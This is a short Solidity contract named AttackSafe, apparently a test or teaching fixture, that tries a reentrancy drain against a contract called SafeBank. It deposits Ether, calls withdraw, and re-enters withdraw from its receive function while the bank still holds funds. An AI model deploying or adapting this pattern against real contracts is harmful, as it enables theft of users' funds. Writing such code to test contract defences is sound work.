// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SafeBank.sol";

contract AttackSafe {
    SafeBank public bank;

    constructor(address _bank) {
        bank = SafeBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}
